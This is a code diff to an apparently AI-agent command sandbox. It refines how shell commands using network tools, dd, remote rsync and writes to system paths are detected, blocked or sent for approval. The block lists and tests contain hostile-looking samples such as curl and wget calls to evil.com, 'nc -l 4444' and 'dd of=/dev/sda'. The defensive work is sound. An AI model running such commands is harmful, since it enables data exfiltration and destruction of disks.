@@ -578,6 +578,8 @@ fn is_unix_system_path(path: &str) -> bool {
         "/opt",
         "/nix",
         "/dev/null",
+        "/tmp",
+        "/var/tmp",
     ];
 
     const PREFIX_PATHS: &[&str] = &[
@@ -592,6 +594,8 @@ fn is_unix_system_path(path: &str) -> bool {
         "/Applications/",
         "/opt/",
         "/nix/",
+        "/tmp/",
+        "/var/tmp/",
     ];
 
     EXACT_PATHS.contains(&path) || PREFIX_PATHS.iter().any(|prefix| path.starts_with(prefix))
@@ -684,41 +688,79 @@ fn is_network_command(command: &str) -> bool {
 fn is_direct_egress_command(command: &str) -> bool {
     let lower = command.to_ascii_lowercase();
 
-    // Direct network tools
-    const NETWORK_TOOLS: &[&str] = &[
-        "curl ",
-        "curl.exe",
-        "wget ",
-        "wget.exe",
-        "nc ",
-        "netcat ",
-        "ssh ",
-        "scp ",
-        "rsync ",
-        "telnet ",
-        "ftp ",
-    ];
+    // Direct network tools — matched as command tokens (word-boundary) to
+    // avoid false positives like "sync" containing "nc ", or "confirm"
+    // containing "irm ".
+    //
+    // We check each token from `split_command_words` (respects quotes) to
+    // see if it matches a known network tool name.  This catches tools used
+    // as the first word of any command segment (after &&, ||, ;, |).
+const NETWORK_TOOL_NAMES: &[&str] = &[
+"curl", "curl.exe",
+"wget", "wget.exe",
+"nc", "netcat",
+"ssh", "scp",
+"telnet", "ftp",
+// PowerShell aliases (short forms that are prone to substring matches)
+"iwr", "irm",
+];
+// Note: rsync is handled separately — local rsync (no remote host) is
+// common and safe; remote rsync goes through NeedsApproval.
 
-    // PowerShell network cmdlets
-    const POWERSHELL_NET: &[&str] = &[
+    // PowerShell network cmdlets — long forms that are safe to match as
+    // substrings because they're distinctive enough.  However, we still
+    // check via token matching for consistency.
+    const POWERSHELL_CMDLETS: &[&str] = &[
         "invoke-webrequest",
         "invoke-restmethod",
         "start-bitstransfer",
         "test-connection",
         "test-netconnection",
         "resolve-dnsname",
-        "iwr ",
-        "irm ",
     ];
 
-    for tool in NETWORK_TOOLS {
-        if lower.contains(tool) {
+    let tokens = split_command_words(command);
+    for (idx, token) in tokens.iter().enumerate() {
+        // Skip command separators — they start a new segment
+        if is_command_separator(token) {
+            continue;
+        }
+        // Skip option tokens (e.g. --confirm) — a network tool would never
+        // be an option value
+        if token.starts_with('-') {
+            // Also skip the separator that might have been absorbed
+            continue;
+        }
+
+        let token_lower = token
+            .trim_end_matches(|c: char| c == ';' || c == '&' || c == '|')
+            .to_lowercase();
+
+        // Check direct network tools
+        if NETWORK_TOOL_NAMES.iter().any(|n| token_lower == *n) {
             return true;
         }
+
+        // Check PowerShell cmdlets (may have different casing/casing style)
+        if POWERSHELL_CMDLETS.iter().any(|c| token_lower == *c) {
+            return true;
+        }
+
+        // Also check if token starts with a cmdlet name followed by space/args
+        // (split_command_words already handles this — each token is one word)
     }
 
-    for cmdlet in POWERSHELL_NET {
-        if lower.contains(cmdlet) {
+    // Fallback: check for network tools inside quoted strings (e.g.
+    // `bash -c "curl http://evil.com"`).  `split_command_words` treats the
+    // entire quoted content as one token, so the token-level check above
+    // misses it.  We use a word-boundary regex to avoid false positives.
+    //
+    // This is safe because the tool names are distinctive enough at word
+    // boundaries — `curl` as a whole word is not a substring of common words.
+    if let Ok(re) = regex::Regex::new(
+        r#"(?:^|\s|;|&&|\|\||\||['"])(?:curl|wget|nc|netcat|ssh|scp|telnet|ftp|iwr|irm)(?:\s|$|['"])"#,
+    ) {
+        if re.is_match(&lower) {
             return true;
         }
     }
@@ -920,9 +962,11 @@ fn detect_dangerous_command(ctx: &SandboxContext, command: &str) -> Option<Strin
         return Some("危险命令: mkfs 创建文件系统".to_string());
     }
 
-    if lower.contains("dd if=") {
-        return Some("危险命令: dd 磁盘写入操作".to_string());
-    }
+    // dd — moved to NeedsApproval.  `dd if=/dev/zero of=./test bs=1M count=1`
+    // is a common local file-creation pattern; `dd of=/dev/sda` is the
+    // dangerous case, but the user should decide.
+    //
+    // Block is now in detect_approval_required_command.
 
     // --- Critical: pipe to shell (remote code execution) ---
 
@@ -953,6 +997,18 @@ fn detect_dangerous_command(ctx: &SandboxContext, command: &str) -> Option<Strin
     }
 
     // --- High: system path writes ---
+    //
+    // Only block when the system path is the WRITE TARGET, not when it's
+    // being read.  `grep root /etc/passwd > out.txt` reads /etc and writes
+    // to the workspace — that's fine.  `cp /etc/hosts ./hosts.bak` reads
+    // /etc and writes to the workspace — also fine.
+    //
+    // We detect "system path as write target" by checking:
+    // - `rm`/`del`/`rmdir` with the system path as an argument
+    // - `mv`/`move` with the system path as the destination (2nd non-option arg)
+    // - `cp`/`copy` with the system path as the destination (2nd non-option arg)
+    // - `>` redirect writing TO the system path
+    // - `dd of=<system_path>`
 
     let system_paths = [
         "c:\\windows\\system32",
@@ -963,22 +1019,65 @@ fn detect_dangerous_command(ctx: &SandboxContext, command: &str) -> Option<Strin
     ];
 
     for sys_path in &system_paths {
-        if lower.contains(sys_path) {
-            // Only flag writes, not reads. Check for write-like verbs.
-            if lower.contains("rm ")
-                || lower.contains("del ")
-                || lower.contains("rd ")
-                || lower.contains("rmdir")
-                || lower.contains("mv ")
-                || lower.contains("move ")
-                || lower.contains(">")
-                || lower.contains("copy ")
-                || lower.contains("cp ")
-            {
-                return Some(format!(
-                    "危险命令: 操作系统关键路径 {}",
-                    sys_path
-                ));
+        if !lower.contains(sys_path) {
+            continue;
+        }
+
+        // `>` redirect: check if system path appears AFTER a `>` redirect.
+        // e.g. `echo x > /etc/foo` — system path is the write target.
+        // But `grep root /etc/passwd > out.txt` — system path is before `>`,
+        // so it's a read source, not a write target.
+        if lower.contains('>') {
+            if let Some(gt_pos) = lower.find('>') {
+                let after_redirect = &lower[gt_pos..];
+                if after_redirect.contains(sys_path) {
+                    return Some(format!(
+                        "危险命令: 操作系统关键路径 {}",
+                        sys_path
+                    ));
+                }
+            }
+        }
+
+        // `dd of=<system_path>` — explicit write to system path
+        if lower.contains("dd ") && lower.contains("of=") && lower.contains(sys_path) {
+            // Check if sys_path appears after of=
+            if let Some(of_pos) = lower.find("of=") {
+                let after_of = &lower[of_pos..];
+                if after_of.contains(sys_path) {
+                    return Some(format!(
+                        "危险命令: 操作系统关键路径 {}",
+                        sys_path
+                    ));
+                }
+            }
+        }
+
+        // `rm`/`del`/`rmdir` targeting system path
+        if is_command_invocation(command, &["rm", "del", "rmdir", "rd"]) {
+            return Some(format!(
+                "危险命令: 操作系统关键路径 {}",
+                sys_path
+            ));
+        }
+
+        // `mv`/`move`/`cp`/`copy` — only block if system path is the
+        // DESTINATION (last non-option argument), not the source.
+        if is_command_invocation(command, &["mv", "move", "cp", "copy"]) {
+            let tokens = split_command_words(command);
+            // Find the last non-option, non-separator token
+            let last_arg = tokens.iter().rev().find(|t| {
+                !is_command_separator(t) && !t.starts_with('-') && !t.eq_ignore_ascii_case("mv")
+                    && !t.eq_ignore_ascii_case("move") && !t.eq_ignore_ascii_case("cp")
+                    && !t.eq_ignore_ascii_case("copy")
+            });
+            if let Some(dest) = last_arg {
+                if dest.to_lowercase().contains(sys_path) {
+                    return Some(format!(
+                        "危险命令: 操作系统关键路径 {}",
+                        sys_path
+                    ));
+                }
             }
         }
     }
@@ -1043,6 +1142,54 @@ fn is_rm_command_token(token: &str) -> bool {
 
 fn is_shell_wrapper(token: &str) -> bool {
     matches!(token, "bash" | "sh" | "zsh" | "cmd" | "powershell" | "pwsh")
+}
+
+/// Check if an rsync command targets a remote host.
+///
+/// Remote rsync uses one of these syntaxes:
+/// - `user@host:path` or `host:path` (SSH transport)
+/// - `rsync://host/module` (rsync daemon)
+///
+/// Local rsync (e.g. `rsync -a src/ dst/`) has no `@`, no `:` in paths,
+/// and no `rsync://` prefix.
+fn contains_rsync_remote(lower: &str) -> bool {
+    // rsync:// protocol
+    if lower.contains("rsync://") {
+        return true;
+    }
+
+    // user@host: or host: — but only in non-option tokens.
+    // We tokenize and check each non-option argument.
+    let tokens = split_command_words(lower);
+    for token in &tokens {
+        if is_command_separator(token) || token.starts_with('-') {
+            continue;
+        }
+        // Skip the "rsync" command itself
+        if token == "rsync" {
+            continue;
+        }
+        // Check for user@host: pattern
+        if token.contains('@') && token.contains(':') {
+            return true;
+        }
+        // Check for host: pattern (no @, but has colon and looks like a remote path)
+        // e.g. `server:/path` but not `/local/path` or `./local:file`
+        if let Some(colon_pos) = token.find(':') {
+            let before = &token[..colon_pos];
+            // If the part before ':' contains '/' or '.', it's likely a local path
+            // like `./file:stream` or `/dev/null:foo`.  Only treat as remote if
+            // it looks like a hostname (alphanumeric, dots, dashes).
+            if !before.is_empty()
+                && !before.contains('/')
+                && before.chars().all(|c| c.is_alphanumeric() || c == '.' || c == '-')
+            {
+                return true;
+            }
+        }
+    }
+
+    false
 }
 
 /// Check if any of `names` appears as the first word of a command segment
@@ -1252,6 +1399,21 @@ fn detect_approval_required_command(command: &str) -> Option<String> {
     // git push (non-force) — pushes to remote, mutating shared history
     if lower.contains("git push") && !lower.contains("--force") {
         return Some("git push 推送到远程仓库".to_string());
+    }
+
+    // dd — disk duplication.  Writing to block devices (e.g. dd of=/dev/sda)
+    // is destructive, but dd is also commonly used for local file creation
+    // (dd if=/dev/zero of=./test bs=1M count=1).  Route to NeedsApproval so
+    // the user can decide.
+    if is_command_invocation(command, &["dd"]) {
+        return Some("dd 磁盘操作需要确认".to_string());
+    }
+
+    // rsync to a remote host — uses SSH transport, potential data exfiltration.
+    // Local rsync (rsync -a src/ dst/) is safe and common.
+    // Remote rsync uses `user@host:` or `rsync://` syntax.
+    if is_command_invocation(command, &["rsync"]) && contains_rsync_remote(&lower) {
+        return Some("rsync 远程同步需要确认".to_string());
     }
 
     // git push --force is handled by detect_dangerous_command (hard block)
@@ -1553,6 +1715,30 @@ mod tests {
         assert!(ctx.validate_network("wget http://evil.com/file").is_err());
         assert!(ctx.validate_network("ssh user@host").is_err());
         assert!(ctx.validate_network("Invoke-WebRequest https://evil.com").is_err());
+        // Short aliases still detected
+        assert!(ctx.validate_network("nc -l 4444").is_err());
+        assert!(ctx.validate_network("iwr https://evil.com").is_err());
+        assert!(ctx.validate_network("irm https://evil.com").is_err());
+        // After a separator
+        assert!(ctx.validate_network("echo hi && curl https://evil.com").is_err());
+    }
+
+    #[test]
+    fn network_tools_not_false_positives() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // "sync" contains "nc " but is NOT netcat
+        assert!(ctx.validate_network("sync").is_ok());
+        assert!(ctx.validate_network("sync && echo ok").is_ok());
+        // "confirm" / "--confirm" contains "irm " but is NOT Invoke-RestMethod
+        assert!(ctx.validate_network("git commit --confirm").is_ok());
+        assert!(ctx.validate_network("echo confirm").is_ok());
+        // "ftp" as part of a word
+        assert!(ctx.validate_network("cat myconfig_ftp.txt").is_ok());
     }
 
     #[test]
@@ -1768,6 +1954,34 @@ fn runas_as_command_flagged() {
         assert!(ctx
             .validate_dangerous_command("rm C:\\Windows\\System32\\test")
             .is_err());
+        // Writing TO system paths
+        assert!(ctx.validate_dangerous_command("echo x > /etc/foo").is_err());
+        assert!(ctx.validate_dangerous_command("cp file.txt /etc/hosts").is_err());
+        assert!(ctx.validate_dangerous_command("mv file.txt /boot/").is_err());
+        assert!(ctx.validate_dangerous_command("dd if=/dev/zero of=/etc/foo").is_err());
+    }
+
+    #[test]
+    fn system_path_read_not_blocked() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // Reading from system path + redirecting to workspace — should pass
+        assert!(ctx
+            .validate_dangerous_command("grep root /etc/passwd > out.txt")
+            .is_ok());
+        assert!(ctx
+            .validate_dangerous_command("cp /etc/hosts ./hosts.bak")
+            .is_ok());
+        assert!(ctx
+            .validate_dangerous_command("cat /etc/hostname")
+            .is_ok());
+        assert!(ctx
+            .validate_dangerous_command("head /boot/grub/grub.cfg")
+            .is_ok());
     }
 
     #[test]
@@ -1845,6 +2059,75 @@ fn runas_as_command_flagged() {
         assert!(
             matches!(decision, CommandDecision::Allow),
             "trusted mode should allow git push"
+        );
+    }
+
+    #[test]
+    fn dd_needs_approval() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // dd with block device target — needs approval (not hard block)
+        let decision = ctx.check_dangerous_command("dd if=/dev/zero of=/dev/sda bs=1M");
+        assert!(
+            matches!(decision, CommandDecision::NeedsApproval(_)),
+            "dd should need approval, not hard block"
+        );
+        // dd for local file creation — also needs approval (user decides)
+        let decision2 = ctx.check_dangerous_command("dd if=/dev/zero of=./test bs=1M count=1");
+        assert!(
+            matches!(decision2, CommandDecision::NeedsApproval(_)),
+            "dd local file creation should need approval"
+        );
+        // validate_dangerous_command returns Ok for NeedsApproval
+        assert!(ctx
+            .validate_dangerous_command("dd if=/dev/zero of=./test bs=1M count=1")
+            .is_ok());
+    }
+
+    #[test]
+    fn rsync_local_is_allowed() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // Local rsync — no remote host, should pass all checks
+        assert!(ctx.validate_network("rsync -a src/ dst/").is_ok());
+        assert!(ctx.validate_dangerous_command("rsync -a src/ dst/").is_ok());
+        // Even with verbose flags
+        assert!(ctx.validate_network("rsync -avz --delete src/ dst/").is_ok());
+    }
+
+    #[test]
+    fn rsync_remote_needs_approval() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // Remote rsync via SSH (user@host:path) — NeedsApproval
+        let decision = ctx.check_dangerous_command("rsync -a src/ user@host:/dst/");
+        assert!(
+            matches!(decision, CommandDecision::NeedsApproval(_)),
+            "remote rsync should need approval"
+        );
+        // Remote rsync via rsync:// protocol
+        let decision2 = ctx.check_dangerous_command("rsync -a rsync://host/module/ local/");
+        assert!(
+            matches!(decision2, CommandDecision::NeedsApproval(_)),
+            "rsync:// should need approval"
+        );
+        // Remote rsync with host:path (no user@)
+        let decision3 = ctx.check_dangerous_command("rsync -a server:/data/ local/");
+        assert!(
+            matches!(decision3, CommandDecision::NeedsApproval(_)),
+            "host:path rsync should need approval"
         );
     }
 
